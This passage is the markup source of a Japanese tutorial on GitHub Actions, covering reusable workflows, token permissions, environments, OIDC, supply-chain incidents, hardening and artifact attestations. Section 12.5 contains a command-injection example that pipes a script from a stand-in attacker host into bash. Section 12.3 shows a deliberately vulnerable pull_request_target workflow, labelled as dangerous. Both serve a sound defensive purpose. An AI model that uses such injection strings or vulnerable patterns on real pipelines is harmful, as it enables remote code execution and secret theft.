                <div className="code-line">          <span className="prop">node-version</span>: <span className="val">${'{'}{'{'} inputs.node-version {'}'}{'}'}</span></div>
                <div className="code-line">      - <span className="kw">run</span>: npm ci</div>
                <div className="code-line">        <span className="kw">env</span>:</div>
                <div className="code-line">          <span className="prop">NODE_AUTH_TOKEN</span>: <span className="val">${'{'}{'{'} secrets.NPM_TOKEN {'}'}{'}'}</span></div>
                <div className="code-line">      - <span className="kw">run</span>: npm run build</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/upload-artifact@v4</div>
                <div className="code-line">        <span className="kw">with</span>:</div>
                <div className="code-line">          <span className="prop">name</span>: dist</div>
                <div className="code-line">          <span className="prop">path</span>: dist/</div>
              </div>
            </div>

            <p>呼び出し側は次のようにジョブレベルで参照する。</p>

            <div className="code-block">
              <div className="code-header">
                <span>caller.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="kw">jobs</span>:</div>
                <div className="code-line">  <span className="prop">call-build</span>:</div>
                <div className="code-line">    <span className="kw">uses</span>: octo-org/shared-workflows/.github/workflows/reusable-build.yml@v1</div>
                <div className="code-line">    <span className="kw">with</span>:</div>
                <div className="code-line">      <span className="prop">node-version</span>: <span className="str">'22'</span></div>
                <div className="code-line">    <span className="prop">secrets</span>:</div>
                <div className="code-line">      <span className="prop">NPM_TOKEN</span>: <span className="val">${'{'}{'{'} secrets.NPM_TOKEN {'}'}{'}'}</span></div>
              </div>
            </div>

            <h3>8.3 複合アクションの例</h3>
            <div className="code-block">
              <div className="code-header">
                <span>.github/actions/setup-python-env/action.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="kw">name</span>: <span className="str">Setup Python Environment</span></div>
                <div className="code-line"><span className="kw">description</span>: <span className="str">Pythonのセットアップと依存関係インストールをまとめた複合アクション</span></div>
                <div className="code-line"><span className="kw">inputs</span>:</div>
                <div className="code-line">  <span className="prop">python-version</span>:</div>
                <div className="code-line">    <span className="prop">default</span>: <span className="str">'3.12'</span></div>
                <div className="code-line"><span className="kw">runs</span>:</div>
                <div className="code-line">  <span className="prop">using</span>: composite</div>
                <div className="code-line">  <span className="prop">steps</span>:</div>
                <div className="code-line">    - <span className="kw">uses</span>: actions/setup-python@v5</div>
                <div className="code-line">      <span className="kw">with</span>:</div>
                <div className="code-line">        <span className="prop">python-version</span>: <span className="val">${'{'}{'{'} inputs.python-version {'}'}{'}'}</span></div>
                <div className="code-line">        <span className="prop">cache</span>: pip</div>
                <div className="code-line">    - <span className="kw">run</span>: pip install -r requirements.txt</div>
                <div className="code-line">      <span className="prop">shell</span>: bash   <span className="cm"># 複合アクション内のrunステップはshellの明示指定が必須</span></div>
              </div>
            </div>

            <h3>8.4 アーキテクチャ上の位置づけ</h3>
            <div className="diagram-block">
              <div className="diagram-caption">Fig. 8-1 — 再利用可能なワークフローと複合アクションの関係</div>
              <Mermaid chart={DIAGRAM_8_1} />
            </div>

            <h3>8.5 バージョン管理のベストプラクティス</h3>
            <p>
              社内で共有する再利用可能なワークフローや複合アクションは、次のようにバージョニングすることが推奨される。
            </p>
            <ul>
              <li>開発中は<code>@main</code>や<code>@dev</code>ブランチを参照して迅速に反復する</li>
              <li>安定版はセマンティックバージョニングのタグ(<code>@v1</code>)、本番運用では<strong>コミットSHA固定</strong>を使う(12章で詳述)</li>
              <li>複合アクションと再利用可能なワークフローを同一リポジトリにまとめておくと、両者を同じコミットでテスト・リリースしやすくなる</li>
            </ul>

            <div className="callout info">
              <div className="callout-title">参考URL</div>
              <p>
                <a href="https://docs.github.com/en/actions/concepts/workflows-and-actions/reusing-workflow-configurations" target="_blank" rel="noopener noreferrer">
                  ワークフローの再利用
                </a>{' '}
                ·{' '}
                <a href="https://github.com/orgs/community/discussions/171037" target="_blank" rel="noopener noreferrer">
                  コミュニティディスカッション: 再利用パターンの運用
                </a>
              </p>
            </div>
          </section>

          {/* ============ SECTION 9 ============ */}
          <section id="sec-9">
            <div className="section-head">
              <span className="section-num">09</span>
              <h2>GITHUB_TOKENとパーミッションモデル</h2>
            </div>

            <p>
              <code>GITHUB_TOKEN</code>は、ワークフロー実行のたびにGitHubが自動生成する一時的なインストールアクセストークンである。
              2021年により細かい権限モデルが導入され、現在では新規リポジトリ・組織のデフォルトはread-onlyになっているが、
              既存のリポジトリでは書き込み可能な設定のままになっているケースも多い。
            </p>

            <h3>9.1 権限スコープの一覧(抜粋)</h3>
            <p>
              <code>permissions</code>キーで指定できる主なスコープと値(<code>read</code> / <code>write</code> / <code>none</code>)は以下の通り。
            </p>

            <div className="table-wrap">
              <table>
                <thead>
                  <tr>
                    <th>スコープ</th>
                    <th>説明</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><code>contents</code></td>
                    <td>リポジトリ内容の読み書き(チェックアウト・コミット等)</td>
                  </tr>
                  <tr>
                    <td><code>pull-requests</code></td>
                    <td>PRの作成・コメント・ラベル付け</td>
                  </tr>
                  <tr>
                    <td><code>issues</code></td>
                    <td>Issueの作成・コメント・クローズ</td>
                  </tr>
                  <tr>
                    <td><code>id-token</code></td>
                    <td>OIDCトークンの発行要求(11章)</td>
                  </tr>
                  <tr>
                    <td><code>packages</code></td>
                    <td>GitHub Packagesへの読み書き</td>
                  </tr>
                  <tr>
                    <td><code>deployments</code></td>
                    <td>デプロイステータスの更新</td>
                  </tr>
                  <tr>
                    <td><code>attestations</code></td>
                    <td>Artifact Attestationsの生成(13章)</td>
                  </tr>
                  <tr>
                    <td><code>actions</code></td>
                    <td>ワークフロー実行のキャンセル・再実行等</td>
                  </tr>
                  <tr>
                    <td><code>security-events</code></td>
                    <td>Code ScanningへのSARIFアップロード等</td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="callout danger">
              <div className="callout-title">重要な挙動</div>
              <p>
                いずれかのパーミッションの値を指定した場合、明示していない他のすべてのパーミッションは<code>none</code>に
                設定される。つまり「1つだけ<code>write</code>にしたつもりが、他の権限がすべて剥奪される」という
                予期せぬ挙動を招くことがあるため、必要な権限をすべて列挙する必要がある。
              </p>
            </div>

            <div className="code-block">
              <div className="code-header">
                <span>permissions.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="kw">permissions</span>:</div>
                <div className="code-line">  <span className="prop">contents</span>: read</div>
                <div className="code-line">  <span className="prop">pull-requests</span>: write   <span className="cm"># PRへのコメント投稿のみ許可</span></div>
                <div className="code-line">  <span className="prop">issues</span>: none</div>
              </div>
            </div>

            <h3>9.2 最小権限の原則を徹底する</h3>
            <ul>
              <li>
                ワークフロー全体では<code>permissions: {'{}'}</code>または<code>contents: read</code>を既定にし、書き込みが必要なジョブだけにジョブレベルで権限を追加する。
              </li>
              <li>
                フォークからの<code>pull_request</code>イベントでは、既定でGITHUB_TOKENが読み取り専用になり、シークレットへのアクセスも制限される。これは意図的なセキュリティ設計であり、安易に緩めるべきではない。
              </li>
              <li>リポジトリ設定の「Workflow permissions」でも、組織・リポジトリ単位のデフォルトを制御できる。</li>
            </ul>

            <div className="callout info">
              <div className="callout-title">参考URL</div>
              <p>
                <a href="https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/controlling-permissions-for-github_token" target="_blank" rel="noopener noreferrer">
                  GITHUB_TOKENの権限制御
                </a>{' '}
                ·{' '}
                <a href="https://github.blog/changelog/2023-02-02-github-actions-updating-the-default-github_token-permissions-to-read-only/" target="_blank" rel="noopener noreferrer">
                  デフォルト権限をread-onlyに変更する告知
                </a>{' '}
                ·{' '}
                <a href="https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository" target="_blank" rel="noopener noreferrer">
                  リポジトリのActions設定管理
                </a>{' '}
                ·{' '}
                <a href="https://github.blog/security/new-tool-to-secure-your-github-actions/" target="_blank" rel="noopener noreferrer">
                  過剰な権限を検出するツール
                </a>
              </p>
            </div>
          </section>

          {/* ============ SECTION 10 ============ */}
          <section id="sec-10">
            <div className="section-head">
              <span className="section-num">10</span>
              <h2>Secrets・Variables・Environments</h2>
            </div>

            <h3>10.1 3つのスコープ</h3>
            <p>
              Secretsと設定用のVariablesは、リポジトリ・組織・環境(Environment)の3段階でスコープできる。
              環境スコープのシークレットは、対応する環境を参照するジョブのみがアクセスでき、環境に保護ルールが
              設定されている場合は承認が下りるまでアクセスできない。
            </p>

            <h3>10.2 環境の保護ルール(Deployment Protection Rules)</h3>
            <p>
              Environmentsは単なる名前空間ではなく、デプロイに対するゲートとして機能する。設定できる主な保護ルールは次の通り。
            </p>

            <div className="table-wrap">
              <table>
                <thead>
                  <tr>
                    <th>保護ルール</th>
                    <th>内容</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>Required reviewers</td>
                    <td>最大6人/チームを指定でき、うち1人の承認でジョブが進行する。自己承認を禁止するオプションもある</td>
                  </tr>
                  <tr>
                    <td>Wait timer</td>
                    <td>ジョブトリガー後、1〜43,200分(最大30日)の待機時間を強制できる(待機時間は課金対象時間に含まれない)</td>
                  </tr>
                  <tr>
                    <td>Deployment branches/tags</td>
                    <td>特定のブランチ・タグ・保護ブランチのみがデプロイ可能、という制限をかけられる</td>
                  </tr>
                  <tr>
                    <td>カスタム保護ルール(GitHub Apps)</td>
                    <td>Datadog・ServiceNowなど外部サービスによる自動承認をゲートとして組み込める</td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="code-block">
              <div className="code-header">
                <span>environments.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="kw">jobs</span>:</div>
                <div className="code-line">  <span className="prop">deploy-staging</span>:</div>
                <div className="code-line">    <span className="prop">runs-on</span>: ubuntu-latest</div>
                <div className="code-line">    <span className="prop">environment</span>: staging</div>
                <div className="code-line">    <span className="prop">steps</span>:</div>
                <div className="code-line">      - <span className="kw">run</span>: ./deploy.sh</div>
                <div className="code-line"></div>
                <div className="code-line">  <span className="prop">deploy-production</span>:</div>
                <div className="code-line">    <span className="prop">needs</span>: deploy-staging</div>
                <div className="code-line">    <span className="prop">runs-on</span>: ubuntu-latest</div>
                <div className="code-line">    <span className="prop">environment</span>:</div>
                <div className="code-line">      <span className="prop">name</span>: production</div>
                <div className="code-line">      <span className="prop">url</span>: https://example.com</div>
                <div className="code-line">    <span className="prop">steps</span>:</div>
                <div className="code-line">      - <span className="kw">run</span>: ./deploy.sh   <span className="cm"># 承認・待機タイマーを通過した後にのみ実行される</span></div>
              </div>
            </div>

            <div className="diagram-block">
              <div className="diagram-caption">Fig. 10-1 — 環境保護ルールを通過するデプロイフロー</div>
              <Mermaid chart={DIAGRAM_10_1} />
            </div>

            <p>
              環境シークレットは、保護ルールをすべて通過するまでジョブから利用できない。これにより
              「承認が下りるまで本番用の認証情報を一切ジョブに渡さない」という設計が実現できる。
            </p>

            <div className="callout info">
              <div className="callout-title">参考URL</div>
              <p>
                <a href="https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments" target="_blank" rel="noopener noreferrer">
                  デプロイと環境
                </a>{' '}
                ·{' '}
                <a href="https://docs.github.com/actions/deployment/targeting-different-environments/using-environments-for-deployment" target="_blank" rel="noopener noreferrer">
                  環境を使ったデプロイ管理
                </a>{' '}
                ·{' '}
                <a href="https://docs.github.com/en/actions/how-tos/deploy/configure-and-manage-deployments/control-deployments" target="_blank" rel="noopener noreferrer">
                  デプロイ制御
                </a>
              </p>
            </div>
          </section>

          {/* ============ SECTION 11 ============ */}
          <section id="sec-11">
            <div className="section-head">
              <span className="section-num">11</span>
              <h2>OpenID Connect (OIDC) によるキーレス認証</h2>
            </div>

            <p>
              クラウドプロバイダー(AWS/Azure/GCP等)へのデプロイでは、長期的なアクセスキーをGitHub Secretsに
              保存する代わりに、OIDCによる短命トークン交換を使うことが2026年時点でのベストプラクティスとされている。
            </p>

            <p>
              ジョブが実行されるたびに、GitHubのOIDCプロバイダーが自動的にOIDCトークンを生成する。このトークンには、
              認証を試みている特定のワークフローについて、セキュリティが強化された検証可能なアイデンティティを
              確立するための複数のクレームが含まれる。クラウド側はこのトークンのクレーム(発行者・サブジェクト・
              リポジトリ等)を検証し、条件が一致すれば短命のクラウドアクセストークンを発行する。
            </p>

            <h3>11.1 OIDCの利点</h3>
            <ul>
              <li><strong>長期シークレット不要</strong>: クラウド認証情報をGitHub Secretsに複製する必要がなくなる</li>
              <li><strong>自動失効</strong>: 発行されたアクセストークンはジョブの実行期間内でのみ有効</li>
              <li><strong>粒度の細かい信頼設定</strong>: リポジトリ・ブランチ・環境ごとに異なるロールを割り当てられる</li>
            </ul>

            <h3>11.2 ワークフロー側の設定</h3>
            <div className="code-block">
              <div className="code-header">
                <span>oidc-deploy.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="kw">permissions</span>:</div>
                <div className="code-line">  <span className="prop">id-token</span>: write   <span className="cm"># OIDCトークンの発行に必須</span></div>
                <div className="code-line">  <span className="prop">contents</span>: read</div>
                <div className="code-line"></div>
                <div className="code-line"><span className="kw">jobs</span>:</div>
                <div className="code-line">  <span className="prop">deploy</span>:</div>
                <div className="code-line">    <span className="prop">runs-on</span>: ubuntu-latest</div>
                <div className="code-line">    <span className="prop">steps</span>:</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/checkout@v6</div>
                <div className="code-line">      - <span className="prop">name</span>: Configure AWS credentials via OIDC</div>
                <div className="code-line">        <span className="kw">uses</span>: aws-actions/configure-aws-credentials@v4</div>
                <div className="code-line">        <span className="kw">with</span>:</div>
                <div className="code-line">          <span className="prop">role-to-assume</span>: arn:aws:iam::123456789012:role/GitHubActionsDeployRole</div>
                <div className="code-line">          <span className="prop">aws-region</span>: ap-northeast-1</div>
                <div className="code-line">      - <span className="kw">run</span>: aws s3 sync ./dist s3://my-bucket --delete</div>
              </div>
            </div>

            <p>
              <code>id-token: write</code>を設定しても、それだけでは何のリソースへの書き込み権限も付与されない。
              あくまで「OIDCトークンを要求・利用する」ことを許可するだけであり、実際のアクセス制御はクラウド側の
              信頼ポリシー(IAM Roleの<code>Condition</code>等)で定義する。
            </p>

            <h3>11.3 信頼条件の設計</h3>
            <p>
              AWS IAMロールの信頼ポリシーでは、<code>sub</code>クレームを使って「どのリポジトリ・どのブランチ・どの環境からのリクエストか」を絞り込む。
            </p>

            <div className="code-block">
              <div className="code-header">
                <span>trust-policy.json</span>
                <span>json</span>
              </div>
              <div className="code-content">
                <div className="code-line">{'{'}</div>
                <div className="code-line">  <span className="kw">"Effect"</span>: <span className="str">"Allow"</span>,</div>
                <div className="code-line">  <span className="kw">"Principal"</span>: {'{'}</div>
                <div className="code-line">    <span className="kw">"Federated"</span>: <span className="str">"arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"</span></div>
                <div className="code-line">  {'}'},</div>
                <div className="code-line">  <span className="kw">"Action"</span>: <span className="str">"sts:AssumeRoleWithWebIdentity"</span>,</div>
                <div className="code-line">  <span className="kw">"Condition"</span>: {'{'}</div>
                <div className="code-line">    <span className="kw">"StringEquals"</span>: {'{'}</div>
                <div className="code-line">      <span className="kw">"token.actions.githubusercontent.com:sub"</span>: <span className="str">"repo:octo-org/octo-repo:environment:production"</span></div>
                <div className="code-line">    {'}'}</div>
                <div className="code-line">  {'}'}</div>
                <div className="code-line">{'}'}</div>
              </div>
            </div>

            <p>
              このように環境名まで含めて条件を絞ることで、「productionという名前の環境を通過したワークフローだけが
              本番ロールを引き受けられる」という制御が可能になる。組織・エンタープライズ管理者は、リポジトリの
              カスタムプロパティ(例: <code>business_unit</code>)をOIDCクレームに含めることもでき、属性ベースアクセス制御(ABAC)を実現できる。
            </p>

            <div className="diagram-block">
              <div className="diagram-caption">Fig. 11-1 — OIDCによるキーレス認証の流れ</div>
              <Mermaid chart={DIAGRAM_11_1} />
            </div>

            <p>
              DependabotについてもOIDCによるプライベートレジストリ認証(AWS CodeArtifact・Azure DevOps Artifacts・JFrog Artifactory)がサポートされている。
            </p>

            <div className="callout info">
              <div className="callout-title">参考URL</div>
              <p>
                <a href="https://docs.github.com/en/actions/concepts/security/openid-connect" target="_blank" rel="noopener noreferrer">
                  OpenID Connect概念
                </a>{' '}
                ·{' '}
                <a href="https://docs.github.com/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers" target="_blank" rel="noopener noreferrer">
                  クラウドプロバイダーでのOIDC設定
                </a>{' '}
                ·{' '}
                <a href="https://docs.github.com/en/enterprise-cloud@latest/actions/reference/security/oidc" target="_blank" rel="noopener noreferrer">
                  OIDCリファレンス(Enterprise Cloud)
                </a>
              </p>
            </div>
          </section>

          {/* ============ SECTION 12 ============ */}
          <section id="sec-12">
            <div className="section-head">
              <span className="section-num">12</span>
              <h2>セキュリティ脅威と実践的対策</h2>
            </div>

            <p>
              GitHub Actionsはワークフローの自由度が非常に高い分、セキュリティ責任の大部分が利用者側に委ねられている。
              2025〜2026年にかけて実際に発生した供給網攻撃を踏まえ、優先度の高い脅威モデルを整理する。
            </p>

            <h3>12.1 サードパーティアクションの信頼境界</h3>
            <p>
              アクションを利用する際、そのアクションはワークフローに設定されたすべてのシークレットにアクセスでき、
              GITHUB_TOKENを使ってリポジトリに書き込める可能性があるため、サードパーティリポジトリのアクションを使うことには本質的なリスクが伴う。
            </p>

            <div className="callout success">
              <div className="callout-title">対策</div>
              <ul>
                <li>
                  <strong>フルコミットSHAでピン留めする</strong>。タグ(<code>@v4</code>)やブランチ(<code>@main</code>)は可変であり、
                  アクション作者のアカウントが乗っ取られた場合にタグの指す内容が書き換えられるリスクがある。SHAは不変であるため、この手のすり替えを防げる。
                </li>
                <li>SHAを選ぶ際は、フォークではなく本家リポジトリのコミット履歴から取得したものであることを確認する。</li>
                <li>Dependabotで、ピン留めしたSHAを最新の安全なバージョンに自動更新する運用を組む。</li>
              </ul>
            </div>

            <div className="code-block">
              <div className="code-header">
                <span>pinning.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="cm"># 悪い例: タグは書き換え可能</span></div>
                <div className="code-line">- <span className="kw">uses</span>: some-org/some-action@v3</div>
                <div className="code-line"></div>
                <div className="code-line"><span className="cm"># 良い例: フルコミットSHAでピン留め(タグはコメントで残す)</span></div>
                <div className="code-line">- <span className="kw">uses</span>: some-org/some-action@a1b2c3d4e5f67890123456789012345678901234   <span className="cm"># v3.2.1</span></div>
              </div>
            </div>

            <h3>12.2 実際に起きたサプライチェーン事件(2025〜2026年)</h3>
            <p>理論上のリスクではなく、実際に発生した事例を知ることは対策の優先順位付けに役立つ。</p>

            <div className="table-wrap">
              <table>
                <thead>
                  <tr>
                    <th>時期</th>
                    <th>事件</th>
                    <th>概要</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>2025年3月</td>
                    <td><code>tj-actions/changed-files</code>侵害</td>
                    <td>可変タグを参照していた2万3千以上のリポジトリでシークレットが露出した</td>
                  </tr>
                  <tr>
                    <td>2026年1月</td>
                    <td>Shai-Huludワーム</td>
                    <td>セルフホストランナーとGitHub Discussionsをバックドアのチャネルとして悪用</td>
                  </tr>
                  <tr>
                    <td>2026年3月</td>
                    <td><code>trivy-action</code>のフォースプッシュ改ざん</td>
                    <td>
                      76個中75個のバージョンタグが書き換えられ、実行したパイプラインからシークレットが窃取された。
                      窃取された認証情報は下流のPyPIパッケージの侵害にも連鎖した
                    </td>
                  </tr>
                  <tr>
                    <td>2026年3月</td>
                    <td>Axiosの悪意あるバージョン公開</td>
                    <td><code>1.14.1</code>/<code>0.30.4</code>が約3時間だけ公開され、依存関係を実行時に解決するパイプラインに影響</td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="callout warn">
              <div className="callout-title">教訓</div>
              <p>
                これらの事例に共通するのは、「可変な参照(タグ・ブランチ)への依存」が侵害の入口になっている点である。
                攻撃と検知の間の窓は数日ではなく数時間であることが多いという指摘は、日常的な監視体制の重要性を示している。
              </p>
            </div>

            <h3>12.3 pull_request_targetと“Pwn Request”</h3>
            <p>
              <code>pull_request_target</code>は、ワークフローおよび明示的な<code>ref</code>指定のない<code>actions/checkout</code>呼び出しが、
              プルリクエストではなくベースリポジトリの既定ブランチから取得される、という重要かつ見落とされがちな変更を加えるイベントである。
              この設計により、ベースブランチの信頼済みコードだけが実行されるため、シークレットと読み書き可能なトークンを安全に付与できる、というのが本来の意図である。
            </p>

            <p>
              しかし開発者がこの既定動作を上書きし、フォークのコードを実行するようにしてしまうと危険になる。典型的な脆弱パターンは以下の通り。
            </p>

            <div className="code-block">
              <div className="code-header">
                <span>vulnerable-pull_request_target.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="cm"># 危険な例: フォークのPRヘッドを明示的にチェックアウトしている</span></div>
                <div className="code-line"><span className="kw">on</span>: pull_request_target</div>
                <div className="code-line"><span className="kw">jobs</span>:</div>
                <div className="code-line">  <span className="prop">build</span>:</div>
                <div className="code-line">    <span className="prop">runs-on</span>: ubuntu-latest</div>
                <div className="code-line">    <span className="prop">permissions</span>:</div>
                <div className="code-line">      <span className="prop">contents</span>: write</div>
                <div className="code-line">    <span className="prop">steps</span>:</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/checkout@v6</div>
                <div className="code-line">        <span className="kw">with</span>:</div>
                <div className="code-line">          <span className="prop">ref</span>: <span className="val">${'{'}{'{'} github.event.pull_request.head.sha {'}'}{'}'}</span>   <span className="cm"># 危険: フォークの未検証コードを取得</span></div>
                <div className="code-line">      - <span className="kw">run</span>: make test   <span className="cm"># ベースリポジトリの権限で攻撃者のコードを実行してしまう</span></div>
              </div>
            </div>

            <p>
              このように<code>pull_request_target</code>を使うワークフローがフォークからコードをチェックアウトすると、
              すべてのシークレットと高権限のGITHUB_TOKENが露出し、深刻なセキュリティリスクを生む。
            </p>

            <div className="diagram-block">
              <div className="diagram-caption">Fig. 12-1 — pull_request と pull_request_target の危険性の違い</div>
              <Mermaid chart={DIAGRAM_12_1} />
            </div>

            <div className="callout danger">
              <div className="callout-title">対策の指針(意思決定順)</div>
              <ol>
                <li>シークレットや書き込み権限が不要なら<strong>pull_requestを使う</strong>(最優先の選択肢)。</li>
                <li>どうしても<code>pull_request_target</code>が必要な場合、フォークのコードを明示的にチェックアウトしない。ラベリングやコメント投稿などシークレット不要な処理に限定する。</li>
                <li>フォークのコードに対してテストを実行したい場合は、<code>pull_request</code>(非特権)でテストし、その完了を<code>workflow_run</code>(特権)で検知して後続処理を行う権限分離パターンに再設計する。</li>
                <li><code>actions/checkout</code> v7以降では、<code>pull_request_target</code>および<code>workflow_run</code>においてフォークPRのヘッド/マージコミットの取得が既定でブロックされるようになった。</li>
                <li>2025年12月8日以降、<code>pull_request_target</code>はワークフロー定義自体が常に既定ブランチから読み込まれるよう変更された。</li>
              </ol>
            </div>

            <h3>12.4 セルフホストランナーのリスク</h3>
            <p>
              GitHubホスト型ランナーはエフェメラルかつ隔離された仮想マシン内でコードを実行するため安全である一方、
              セルフホストランナーはワークフロー内の信頼できないコードによって永続的に侵害される可能性がある。
              そのためセルフホストランナーはパブリックリポジトリでは使用すべきではない。
            </p>

            <div className="callout success">
              <div className="callout-title">セルフホストランナーを使う場合の必須対策</div>
              <ul>
                <li>パブリックリポジトリでは使用しない。</li>
                <li><strong>エフェメラル(使い捨て)モード</strong>で運用し、ジョブ実行後に環境を破棄する。</li>
                <li><strong>Runner Groups</strong>でランナーを信頼レベル・プロジェクト・チーム単位に分離する。</li>
                <li>ランナーマシン上に長期的な機密情報を置かない。</li>
                <li>ネットワークegressの監視を行う。</li>
                <li>ホスト単位のテレメトリを別環境へ即座に転送する。</li>
              </ul>
            </div>

            <h3>12.5 コマンドインジェクション対策</h3>
            <p>
              PRタイトル・Issue本文・コメントなど、攻撃者が制御可能な文字列を<code>run:</code>ブロックにそのまま
              埋め込むと、シェルコマンドインジェクションを許してしまう。
            </p>

            <div className="code-block">
              <div className="code-header">
                <span>injection-risk.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="cm"># 危険な例: PRタイトルを直接シェルに展開している</span></div>
                <div className="code-line">- <span className="kw">run</span>: echo "Building <span className="val">${'{'}{'{'} github.event.pull_request.title {'}'}{'}'}</span>"</div>
              </div>
            </div>

            <p>
              PRタイトルに<code>"; curl http://evil.example/steal.sh | bash #"</code>のような文字列が入っていた場合、
              意図しないコマンドが実行され得る。<strong>対策は、外部入力を環境変数経由で渡し、シェル展開ではなく変数参照として扱うこと</strong>である。
            </p>

            <div className="code-block">
              <div className="code-header">
                <span>injection-safe.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="cm"># 安全な例: 環境変数として渡してからシェル内で参照する</span></div>
                <div className="code-line">- <span className="kw">env</span>:</div>
                <div className="code-line">    <span className="prop">PR_TITLE</span>: <span className="val">${'{'}{'{'} github.event.pull_request.title {'}'}{'}'}</span></div>
                <div className="code-line">  <span className="kw">run</span>: echo "Building $PR_TITLE"</div>
              </div>
            </div>

            <div className="callout info">
              <div className="callout-title">参考URL</div>
              <p>
                <a href="https://docs.github.com/en/actions/reference/security/secure-use" target="_blank" rel="noopener noreferrer">
                  セキュアな利用リファレンス
                </a>{' '}
                ·{' '}
                <a href="https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target" target="_blank" rel="noopener noreferrer">
                  pull_request_targetを安全に使う
                </a>{' '}
                ·{' '}
                <a href="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/" target="_blank" rel="noopener noreferrer">
                  GitHub Security Lab: Pwn Requestsを防ぐ
                </a>{' '}
                ·{' '}
                <a href="https://www.sysdig.com/blog/how-threat-actors-are-using-self-hosted-github-actions-runners-as-backdoors" target="_blank" rel="noopener noreferrer">
                  Sysdig: セルフホストランナー悪用手口
                </a>{' '}
                ·{' '}
                <a href="https://www.wiz.io/blog/github-actions-security-guide" target="_blank" rel="noopener noreferrer">
                  Wiz: ハードニングガイド
                </a>
              </p>
            </div>
          </section>

          {/* ============ SECTION 13 ============ */}
          <section id="sec-13">
            <div className="section-head">
              <span className="section-num">13</span>
              <h2>サプライチェーンセキュリティ: Artifact AttestationsとSLSA</h2>
            </div>

            <h3>13.1 SLSAフレームワークとGitHubの対応レベル</h3>
            <p>
              SLSAフレームワークはソフトウェアサプライチェーンのセキュリティを評価する業界標準であり、
              GitHubのArtifact Attestations機能は、追加の設定なしでSLSA v1.0 Build Level 2を満たし、
              再利用可能なワークフローと組み合わせることでLevel 3まで引き上げられる。
            </p>

            <div className="table-wrap">
              <table>
                <thead>
                  <tr>
                    <th>SLSAレベル</th>
                    <th>要件の概要</th>
                    <th>GitHub Actionsでの実現方法</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>Build Level 1</td>
                    <td>ビルドプロセスの来歴(provenance)を記録する</td>
                    <td>ビルドログの保存</td>
                  </tr>
                  <tr>
                    <td>Build Level 2</td>
                    <td>改ざん耐性のあるビルドサービスで来歴を生成する</td>
                    <td><code>actions/attest</code>によるArtifact Attestations</td>
                  </tr>
                  <tr>
                    <td>Build Level 3</td>
                    <td>ユーザー定義のビルドステップから署名鍵materialを隔離する</td>
                    <td>再利用可能なワークフローでビルドと署名を分離</td>
                  </tr>
                </tbody>
              </table>
            </div>

            <h3>13.2 Artifact Attestationsの実装</h3>
            <p>
              アーティファクトのビルド来歴を確立するアテステーションを生成するには、
              ワークフローに適切なパーミッションを設定し、<code>attest</code>アクションを使うステップを追加する。
            </p>

            <div className="code-block">
              <div className="code-header">
                <span>attestation.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="kw">permissions</span>:</div>
                <div className="code-line">  <span className="prop">id-token</span>: write</div>
                <div className="code-line">  <span className="prop">contents</span>: read</div>
                <div className="code-line">  <span className="prop">attestations</span>: write</div>
                <div className="code-line"></div>
                <div className="code-line"><span className="kw">jobs</span>:</div>
                <div className="code-line">  <span className="prop">build</span>:</div>
                <div className="code-line">    <span className="prop">runs-on</span>: ubuntu-latest</div>
                <div className="code-line">    <span className="prop">steps</span>:</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/checkout@v6</div>
                <div className="code-line">      - <span className="kw">run</span>: ./build.sh   <span className="cm"># bin/my-artifact.tar.gz を生成する想定</span></div>
                <div className="code-line">      - <span className="prop">name</span>: Generate artifact attestation</div>
                <div className="code-line">        <span className="kw">uses</span>: actions/attest-build-provenance@v3</div>
                <div className="code-line">        <span className="kw">with</span>:</div>
                <div className="code-line">          <span className="prop">subject-path</span>: <span className="str">'bin/my-artifact.tar.gz'</span></div>
              </div>
            </div>

            <p>
              生成されたアテステーションは、公開リポジトリではSigstoreのパブリックグッドインスタンスを使い透明性ログに記録される。
              プライベートリポジトリではGitHub独自のSigstoreインスタンスが使われる。
            </p>

            <h3>13.3 消費側での検証</h3>
            <p>配布されたソフトウェアがどこでどのようにビルドされたかを検証するには、GitHub CLIを使う。</p>

            <div className="code-block">
              <div className="code-header">
                <span>verify.sh</span>
                <span>bash</span>
              </div>
              <div className="code-content">
                <div className="code-line">gh attestation verify PATH/TO/ARTIFACT-BINARY \</div>
                <div className="code-line">  -R ORGANIZATION_NAME/REPOSITORY_NAME</div>
              </div>
            </div>

            <p>
              アテステーションはインターネット接続なしでも検証できるため、エアギャップ環境やKubernetesのAdmission Controller連携にも組み込みやすい。
            </p>

            <div className="callout warn">
              <div className="callout-title">重要な注意点</div>
              <p>
                アテステーション自体はアーティファクトが安全であることを保証するものではなく、ソースコードとビルド手順への追跡可能性を提供するに過ぎない。
              </p>
            </div>

            <div className="callout info">
              <div className="callout-title">参考URL</div>
              <p>
